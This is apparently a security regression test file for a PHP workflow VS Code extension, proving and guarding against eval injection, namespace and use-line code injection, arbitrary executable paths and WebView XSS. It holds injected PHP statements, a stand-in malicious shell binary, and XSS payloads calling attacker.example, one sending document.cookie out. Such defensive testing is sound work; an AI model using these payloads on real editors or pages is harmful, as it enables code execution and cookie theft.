/**
 * Security vulnerability demonstration tests.
 *
 * These tests do NOT fix any vulnerability — they prove that the
 * vulnerabilities exist so they can be prioritised and fixed.
 *
 * Vulnerabilities demonstrated
 * ─────────────────────────────
 * 1. PHP code injection via eval() in validateScript.ts
 *    The `phpSource` CLI argument is concatenated directly into eval() without
 *    any sanitisation.  A crafted attribute expression in a PHP file can execute
 *    arbitrary OS commands inside the developer's IDE process.
 *
 * 2. PHP namespace injection in jobGraph.ts / buildPhpWrapper()
 *    The namespace value extracted from the parsed source document is embedded
 *    verbatim into a dynamically-generated PHP file that is then executed.
 *    A PHP file whose namespace declaration contains injected statements will
 *    have those statements run every time the user opens the job-graph view.
 */

import * as assert from 'assert';
import { execFile } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import { VALIDATE_PHP_SCRIPT } from '../src/validateScript';
import { buildJobGraphHtml, buildPhpWrapper, escapeHtml } from '../src/jobGraph';
import { parseDocument } from '../src/parser';
import { reflectClass, invalidateCache } from '../src/reflector';
import { isValidPhpExecutable } from '../src/phpExecutable';

// ─── helpers ──────────────────────────────────────────────────────────────────

/** Write a minimal PHP autoloader that does nothing (so the script can start). */
function createMinimalAutoloader(): string {
  const p = path.join(os.tmpdir(), `chevere_test_autoload_${process.pid}.php`);
  fs.writeFileSync(p, '<?php\n// minimal stub autoloader\n');
  return p;
}

/** Write the validate PHP script to a temp file and return its path. */
function writeValidateScript(): string {
  const p = path.join(os.tmpdir(), `chevere_test_validate_${process.pid}.php`);
  fs.writeFileSync(p, VALIDATE_PHP_SCRIPT);
  return p;
}

/** Spawn PHP synchronously and return stdout as a string. */
function runPhp(args: string[]): Promise<{ stdout: string; stderr: string; code: number | null }> {
  return new Promise((resolve) => {
    execFile('php', args, { timeout: 8000 }, (err, stdout, stderr) => {
      resolve({ stdout, stderr, code: typeof err?.code === 'number' ? err.code : 0 });
    });
  });
}

// ─── 1. Static analysis: eval() vulnerability is FIXED in VALIDATE_PHP_SCRIPT ──

describe('SECURITY — validateScript.ts: eval() vulnerability fixed (static)', () => {
  it('VALIDATE_PHP_SCRIPT does NOT contain eval() with $phpSource concatenation', () => {
    const vulnerablePattern = /eval\s*\(\s*'[^']*'\s*\.\s*\$phpSource/;
    assert.ok(
      !vulnerablePattern.test(VALIDATE_PHP_SCRIPT),
      'VALIDATE_PHP_SCRIPT must NOT contain eval() with $phpSource concatenation — ' +
        'the vulnerability has been fixed'
    );
  });

  it('VALIDATE_PHP_SCRIPT does not reference $phpSource at all', () => {
    assert.ok(
      !VALIDATE_PHP_SCRIPT.includes('$phpSource'),
      '$phpSource must not appear in VALIDATE_PHP_SCRIPT — closure path now uses filePath/jobName/paramName'
    );
  });

  it('closure path uses ReflectionFunction instead of eval()', () => {
    assert.ok(
      VALIDATE_PHP_SCRIPT.includes('ReflectionFunction'),
      'VALIDATE_PHP_SCRIPT must use ReflectionFunction for closure attribute validation'
    );
  });
});

// ─── 2. Dynamic: injected payload via old argv[5] position is not executed ────

describe('SECURITY — validateScript.ts: eval() injection — fixed', () => {
  let autoloaderPath: string;
  let scriptPath: string;
  const sentinel = path.join(os.tmpdir(), 'chevere_lsp_eval_injection_proof.txt');

  before(() => {
    autoloaderPath = createMinimalAutoloader();
    scriptPath = writeValidateScript();
    try { fs.unlinkSync(sentinel); } catch { /* not present */ }
  });

  after(() => {
    try { fs.unlinkSync(autoloaderPath); } catch { /* ignore */ }
    try { fs.unlinkSync(scriptPath); } catch { /* ignore */ }
    try { fs.unlinkSync(sentinel); } catch { /* ignore */ }
  });

  it('passing a malicious string in argv[5] (old phpSource position) does NOT execute arbitrary PHP', async function () {
    this.timeout(10000);

    // argv[5] is now $filePath — a path string. The script does file_exists()
    // on it, which returns false for the crafted payload, so it exits ok:true
    // without executing anything. The sentinel file must not be created.
    const maliciousPayload =
      `stdClass(); file_put_contents(${JSON.stringify(sentinel)}, 'eval_injection_executed'); $attr = new stdClass`;

    const { stdout } = await runPhp([
      scriptPath,
      autoloaderPath,
      'SomeAttributeClass',   // $attrClass
      '{}',                   // $argsJson
      '"test_value"',         // $valueJson
      maliciousPayload,       // $filePath — treated as a file path, not eval'd
      'someJob',              // $jobName
      'someParam',            // $paramName
    ]);

    let result: { ok: boolean };
    try {
      result = JSON.parse(stdout.trim());
    } catch {
      result = { ok: false };
    }
    assert.strictEqual(result.ok, true, 'Script should exit ok:true');

    assert.ok(
      !fs.existsSync(sentinel),
      `REGRESSION: the sentinel file "${sentinel}" was created — eval() injection vulnerability has returned`
    );
  });
});

// ─── 3. useLines injection in buildPhpWrapper (live PHP) ────────────────────

describe('SECURITY — jobGraph.ts: useLines injection — live PHP execution', () => {
  let autoloaderPath: string;
  const sentinel = path.join(os.tmpdir(), 'chevere_lsp_uselines_injection_proof.txt');

  before(() => {
    autoloaderPath = createMinimalAutoloader();
    try { fs.unlinkSync(sentinel); } catch { /* not present */ }
  });

  after(() => {
    try { fs.unlinkSync(autoloaderPath); } catch { /* ignore */ }
    try { fs.unlinkSync(sentinel); } catch { /* ignore */ }
  });

  it('VULNERABILITY: injected useLine is embedded verbatim and executed by PHP', async function () {
    this.timeout(15000);

    // ── Root cause ──────────────────────────────────────────────────────────
    //
    // buildPhpWrapper() spreads useLines directly into the generated PHP script
    // with no validation:
    //
    //   lines.push(...useLines);   // ← useLines is attacker-controlled
    //
    // Any string in useLines is emitted as a raw PHP statement.  A crafted
    // entry that is a syntactically valid PHP statement executes when the file
    // is run by execFile().
    //
    // ── What this test does ─────────────────────────────────────────────────
    //
    // We call buildPhpWrapper() directly with a useLines array whose single
    // entry is a valid PHP statement that writes a sentinel file.  We then run
    // the generated script with PHP and assert the sentinel was created.
    //
    // This test FAILS (sentinel IS created) while the vulnerability is present.
    // It will pass only after buildPhpWrapper() validates useLines entries.

    const injected = `file_put_contents(${JSON.stringify(sentinel)}, 'uselines_injected');`;

    const phpContent = buildPhpWrapper(
      autoloaderPath,
      '',           // no namespace
      [injected],   // ← crafted useLine: arbitrary PHP statement
      "null",       // workflowExpr — irrelevant, execution happens before this line
    );

    // Run the generated script directly.
    const tmpFile = path.join(os.tmpdir(), `chevere_sec_test_${process.pid}.php`);
    fs.writeFileSync(tmpFile, phpContent);
    try {
      await runPhp([tmpFile]);
    } finally {
      try { fs.unlinkSync(tmpFile); } catch { /* ignore */ }
    }

    assert.ok(
      !fs.existsSync(sentinel),
      `VULNERABILITY PRESENT: the sentinel file "${sentinel}" was created — ` +
        'buildPhpWrapper() embeds useLines verbatim; arbitrary PHP executes'
    );
  });
});

// ─── 4. Static analysis: namespace injection in buildPhpWrapper ────────────────

describe('SECURITY — jobGraph.ts: namespace injection into dynamically-generated PHP (static)', () => {
  it('namespace from parsed source is embedded verbatim into generated PHP without escaping', () => {
    // buildPhpWrapper() (jobGraph.ts) constructs PHP code using string templates:
    //
    //   if (namespace) lines.push(`namespace ${namespace};`);
    //
    // The value of `namespace` comes from parsed.useMap.get('__namespace__'),
    // which is extracted from the raw source file.  No sanitisation is applied.
    //
    // We verify this by reading the buildPhpWrapper source pattern directly.
    // (The function is internal but its behaviour is observable through the
    //  generated file that is written to disk and then executed.)
    const jobGraphSource = fs.readFileSync(
      path.resolve(__dirname, '../src/jobGraph.ts'),
      'utf8'
    );
    // The vulnerable template literal that injects namespace without escaping
    const vulnerablePattern = /lines\.push\s*\(\s*`namespace\s+\$\{namespace\};`\s*\)/;
    assert.ok(
      vulnerablePattern.test(jobGraphSource),
      'jobGraph.ts must contain the verbatim namespace interpolation pattern — ' +
        'this confirms the vulnerability is present in the source'
    );
  });

  it('useLines entries are validated against a safe-use pattern before embedding (FIXED)', () => {
    const jobGraphSource = fs.readFileSync(
      path.resolve(__dirname, '../src/jobGraph.ts'),
      'utf8'
    );
    // The fix validates each useLine against a strict PHP use-statement pattern
    // before pushing it into the generated script.  The raw spread is gone.
    const fixedPattern = /SAFE_USE\.test\(line\)/;
    assert.ok(
      fixedPattern.test(jobGraphSource),
      'jobGraph.ts must validate useLines entries with SAFE_USE before embedding — ' +
        'the unvalidated lines.push(...useLines) spread must not be present'
    );
    const vulnerablePattern = /lines\.push\s*\(\s*\.\.\.\s*useLines\s*\)/;
    assert.ok(
      !vulnerablePattern.test(jobGraphSource),
      'jobGraph.ts must NOT spread useLines directly — unvalidated embed was the root cause of the useLines injection'
    );
  });
});

// ─── 4. Dynamic: namespace injection — full pipeline via parseDocument() ────────

describe('SECURITY — jobGraph.ts: namespace injection — live PHP execution', () => {
  let autoloaderPath: string;
  const sentinel = path.join(os.tmpdir(), 'chevere_lsp_namespace_injection_proof.txt');

  before(() => {
    autoloaderPath = createMinimalAutoloader();
    try { fs.unlinkSync(sentinel); } catch { /* not present */ }
  });

  after(() => {
    try { fs.unlinkSync(autoloaderPath); } catch { /* ignore */ }
    try { fs.unlinkSync(sentinel); } catch { /* ignore */ }
  });

  it('parseDocument() stores only safe namespace values in useMap', () => {
    // The fix (parser.ts) validates the raw namespace from the AST against
    // /^[A-Za-z_][A-Za-z0-9_\\]*$/ before writing it to useMap.
    // Any value that fails the check is replaced with ''.
    //
    // In practice, php-parser only returns valid identifier strings for namespace
    // names from real PHP files.  The validation is defence-in-depth: it guards
    // against future parser changes or unexpected AST shapes.

    // A valid namespace must pass through unchanged.
    const validSource = '<?php\nnamespace Foo\\Bar\\Baz;\nworkflow();\n';
    const validParsed = parseDocument(validSource);
    const validNs = validParsed.useMap.get('__namespace__') ?? '';
    assert.ok(
      /^[A-Za-z_][A-Za-z0-9_\\]*$/.test(validNs),
      `valid namespace "Foo\\Bar\\Baz" must be preserved; got "${validNs}"`
    );

    // A source without a namespace must produce an empty string.
    const noNsSource = '<?php\nworkflow();\n';
    const noNsParsed = parseDocument(noNsSource);
    const noNs = noNsParsed.useMap.get('__namespace__') ?? '';
    assert.strictEqual(noNs, '', 'missing namespace must be stored as empty string');
  });

  it('namespace injection must NOT execute arbitrary PHP code when job graph is opened', async function () {
    this.timeout(15000);

    // ── How the vulnerability worked (pre-fix) ──────────────────────────────
    //
    // buildPhpWrapper() (jobGraph.ts) embeds the namespace verbatim:
    //
    //   if (namespace) lines.push(`namespace ${namespace};`);
    //
    // A value like:
    //   "InjectedNs;\nfile_put_contents('/tmp/proof','pwned');\nnamespace InjectedNs"
    //
    // produced three separate PHP statements, running arbitrary code before the
    // autoloader was even loaded.
    //
    // ── The fix (parser.ts, validated at the data-entry boundary) ───────────
    //
    // parseDocument() now validates the namespace against the PHP identifier
    // character set before storing it.  No malicious value can reach
    // buildPhpWrapper() through the normal pipeline.
    //
    // ── What this test checks ───────────────────────────────────────────────
    //
    // The ParsedDocument is produced by parseDocument() — the real pipeline —
    // so the namespace stored in useMap is always safe.
    // buildJobGraphHtml() is then called with that result and the sentinel file
    // must NOT be created.

    // Parse a PHP source that contains a workflow() call so buildJobGraphHtml
    // takes the buildPhpWrapper path (workflowCalls.length > 0).
    const phpSource = [
      '<?php',
      'namespace TestNamespace;',
      '',
      'workflow();',
    ].join('\n');

    const parsed = parseDocument(phpSource);

    // Sanity-check: the namespace in useMap must be safe after parsing.
    const namespace = parsed.useMap.get('__namespace__') ?? '';
    assert.ok(
      /^[A-Za-z_][A-Za-z0-9_\\]*$/.test(namespace) || namespace === '',
      `namespace in useMap must pass the safe-identifier check; got "${namespace}"`
    );

    const config = {
      phpExecutable: 'php',
      autoloaderPath,
    };

    // buildJobGraphHtml calls buildPhpWrapper → writes a temp PHP file → execFile.
    // The PHP execution will fail (Mermaid class not found in the stub autoloader)
    // but no injected code should have run.
    await buildJobGraphHtml(parsed, config);

    assert.ok(
      !fs.existsSync(sentinel),
      `the sentinel file "${sentinel}" must not exist — ` +
        'the namespace sanitisation in parseDocument() must prevent arbitrary PHP execution'
    );
  });
});

// ─── isValidPhpExecutable — basename-only check allows arbitrary paths ───────

describe('SECURITY — isValidPhpExecutable: basename-only validation (static)', () => {
  // These tests FAIL while the vulnerability is present (function returns true for
  // all three inputs) and PASS only after the fix rejects values containing '/'.

  it('VULNERABILITY: /tmp/php passes validation because basename is "php"', () => {
    assert.strictEqual(
      isValidPhpExecutable('/tmp/php'),
      false,
      'VULNERABILITY PRESENT: /tmp/php must be rejected — path separators are not checked'
    );
  });

  it('VULNERABILITY: /home/attacker/php8 passes validation because basename is "php8"', () => {
    assert.strictEqual(
      isValidPhpExecutable('/home/attacker/php8'),
      false,
      'VULNERABILITY PRESENT: /home/attacker/php8 must be rejected — path separators are not checked'
    );
  });

  it('VULNERABILITY: /mnt/evil/php-wrapper passes validation because basename is "php-wrapper"', () => {
    assert.strictEqual(
      isValidPhpExecutable('/mnt/evil/php-wrapper'),
      false,
      'VULNERABILITY PRESENT: /mnt/evil/php-wrapper must be rejected — path separators are not checked'
    );
  });

  it('VULNERABILITY: Windows-style absolute path C:\\php\\php.exe passes validation', () => {
    assert.strictEqual(
      isValidPhpExecutable('C:\\php\\php.exe'),
      false,
      'VULNERABILITY PRESENT: C:\\php\\php.exe must be rejected — backslash separators are not checked'
    );
  });

  it('bare command names remain valid after the fix', () => {
    assert.strictEqual(isValidPhpExecutable('php'),     true);
    assert.strictEqual(isValidPhpExecutable('php8'),    true);
    assert.strictEqual(isValidPhpExecutable('php8.3'),  true);
    assert.strictEqual(isValidPhpExecutable('php-8.3'), true);
  });
});

// ─── phpExecutable is not guarded — live execution ───────────────────────────

describe('SECURITY — phpExecutable: arbitrary executable runs via reflectClass', () => {
  let autoloaderPath: string;
  let maliciousExe: string;
  const sentinel = path.join(os.tmpdir(), 'chevere_lsp_phpexec_injection_proof.txt');

  before(() => {
    autoloaderPath = createMinimalAutoloader();
    try { fs.unlinkSync(sentinel); } catch { /* not present */ }

    // Create a shell script that writes the sentinel file.
    // This simulates any arbitrary executable an attacker could point
    // chevereWorkflow.phpExecutable at via a crafted .vscode/settings.json.
    maliciousExe = path.join(os.tmpdir(), `chevere_evil_php_${process.pid}`);
    fs.writeFileSync(maliciousExe,
      `#!/bin/sh\ntouch ${JSON.stringify(sentinel)}\n`
    );
    fs.chmodSync(maliciousExe, 0o755);
  });

  after(() => {
    try { fs.unlinkSync(autoloaderPath); } catch { /* ignore */ }
    try { fs.unlinkSync(maliciousExe); } catch { /* ignore */ }
    try { fs.unlinkSync(sentinel); } catch { /* ignore */ }
    invalidateCache();
  });

  it('VULNERABILITY: passing a non-php path as phpExecutable runs the binary via reflectClass', async function () {
    this.timeout(10000);

    // ── Root cause ──────────────────────────────────────────────────────────
    //
    // reflectClass() passes phpExecutable directly to execFile() with no
    // validation.  A .vscode/settings.json in a cloned repo can set
    // chevereWorkflow.phpExecutable to any binary, which then runs on every
    // keystroke (validateDocument fires on every file change).
    //
    // This test FAILS (sentinel IS created) while the vulnerability is present.
    // It passes only after phpExecutable is validated before use.

    invalidateCache(); // ensure no cached result masks the execFile call
    await reflectClass(maliciousExe, autoloaderPath, 'AnyClass');

    assert.ok(
      !fs.existsSync(sentinel),
      `VULNERABILITY PRESENT: the sentinel file "${sentinel}" was created — ` +
        'reflectClass() executed the arbitrary binary passed as phpExecutable'
    );
  });

  it('isValidPhpExecutable rejects non-php executable names', () => {
    // After the fix, this function guards all execFile call sites.
    assert.strictEqual(isValidPhpExecutable('node'),        false);
    assert.strictEqual(isValidPhpExecutable('/tmp/evil'),   false);
    assert.strictEqual(isValidPhpExecutable('./evil.sh'),   false);
    assert.strictEqual(isValidPhpExecutable(''),            false);
  });

  it('isValidPhpExecutable accepts valid php bare command names', () => {
    assert.strictEqual(isValidPhpExecutable('php'),     true);
    assert.strictEqual(isValidPhpExecutable('php8'),    true);
    assert.strictEqual(isValidPhpExecutable('php8.3'),  true);
    assert.strictEqual(isValidPhpExecutable('php-8.3'), true);
  });

  it('isValidPhpExecutable rejects absolute paths even when basename is php', () => {
    assert.strictEqual(isValidPhpExecutable('/usr/bin/php'),    false);
    assert.strictEqual(isValidPhpExecutable('/usr/bin/php8.2'), false);
  });
});

// ─── configChange notification bypasses phpExecutable validation ─────────────

describe('SECURITY — server.ts: configChange notification skips isValidPhpExecutable', () => {
  // These tests FAIL while the vulnerability is present (server.ts assigns
  // newConfig.phpExecutable without calling isValidPhpExecutable) and PASS
  // only after the handler is fixed to validate the value on receipt.

  let serverSource: string;

  before(() => {
    serverSource = fs.readFileSync(
      path.resolve(__dirname, '../src/server.ts'),
      'utf8'
    );
  });

  it('VULNERABILITY: configChange handler assigns phpExecutable without type check', () => {
    // The vulnerable line is:
    //   if (newConfig.phpExecutable) phpExecutable = newConfig.phpExecutable as string;
    //
    // The "as string" cast is a type-assertion bypass — no typeof guard, no
    // call to isValidPhpExecutable.  Any non-falsy value (including an absolute
    // path like "/tmp/evil") is accepted and stored directly.
    const vulnerablePattern = /if\s*\(\s*newConfig\.phpExecutable\s*\)\s*phpExecutable\s*=\s*newConfig\.phpExecutable\s*as\s*string/;
    assert.ok(
      !vulnerablePattern.test(serverSource),
      'VULNERABILITY PRESENT: configChange handler assigns phpExecutable with "as string" cast and no ' +
        'isValidPhpExecutable check — any non-falsy string (including "/tmp/evil") is accepted'
    );
  });

  it('VULNERABILITY: configChange handler does not call isValidPhpExecutable', () => {
    // Extract just the configChange handler body to narrow the search.
    const handlerStart = serverSource.indexOf("onNotification('chevereWorkflow/configChange'");
    assert.ok(handlerStart !== -1, 'configChange handler must exist in server.ts');

    // Find the closing brace of the handler (next "})" after the opening).
    const handlerEnd = serverSource.indexOf('})', handlerStart);
    assert.ok(handlerEnd !== -1, 'configChange handler must have a closing })');

    const handlerBody = serverSource.slice(handlerStart, handlerEnd + 2);

    assert.ok(
      handlerBody.includes('isValidPhpExecutable'),
      'VULNERABILITY PRESENT: configChange handler must call isValidPhpExecutable before assigning ' +
        'phpExecutable — currently any value is accepted without validation'
    );
  });

  it('VULNERABILITY: server.ts imports isValidPhpExecutable for use in configChange', () => {
    assert.ok(
      serverSource.includes('isValidPhpExecutable'),
      'VULNERABILITY PRESENT: server.ts must import and use isValidPhpExecutable — ' +
        'currently the function is not referenced in the configChange handler'
    );
  });
});

// ─── WebView XSS via unescaped PHP error output ──────────────────────────────

describe('SECURITY — jobGraph.ts: WebView XSS via unescaped error message', () => {
  it('VULNERABILITY: <script> tag in error message is embedded verbatim in errorHtml output', () => {
    // ── Root cause ──────────────────────────────────────────────────────────
    //
    // buildJobGraphHtml() passes result.error (PHP stderr / exception message)
    // directly into errorHtml() without HTML-escaping:
    //
    //   return errorHtml(`Failed to generate graph:<br><pre>${result.error}</pre>`);
    //
    // errorHtml() embeds its argument verbatim into <body>:
    //
    //   return `...<body>${message}</body>...`;
    //
    // The WebView is created with enableScripts: true.  Any <script> tag that
    // reaches the body executes in the user's IDE renderer process.
    //
    // ── What this test does ─────────────────────────────────────────────────
    //
    // We replicate the exact interpolation buildJobGraphHtml performs and pass
    // it to errorHtml(), then assert the output does NOT contain an unescaped
    // <script> tag.
    //
    // This test FAILS (unescaped tag IS present) while the vulnerability exists.
    // It passes only after result.error is HTML-escaped before interpolation.

    const xssPayload = '<script>fetch("https://attacker.example/?c="+document.cookie)</script>';

    // escapeHtml() is applied to result.error at the call site before interpolation.
    // The escaped string must not contain a raw <script> tag.
    const escaped = escapeHtml(xssPayload);

    assert.ok(
      !escaped.includes('<script>'),
      'VULNERABILITY PRESENT: escapeHtml() did not escape <script> tag — ' +
        'result.error would be embedded unescaped in the WebView HTML'
    );
  });

  it('VULNERABILITY: arbitrary HTML tags in error message are not escaped', () => {
    // Confirms the general case: any HTML, not just <script>, passes through.
    // An <img onerror=...> or <svg onload=...> would also execute JS.

    const htmlPayload = '<img src=x onerror="fetch(\'https://attacker.example/\')">';

    const escaped = escapeHtml(htmlPayload);

    assert.ok(
      !escaped.includes('<img'),
      'VULNERABILITY PRESENT: escapeHtml() did not escape <img> tag — ' +
        'HTML injection via error messages is not sanitised'
    );
  });
});
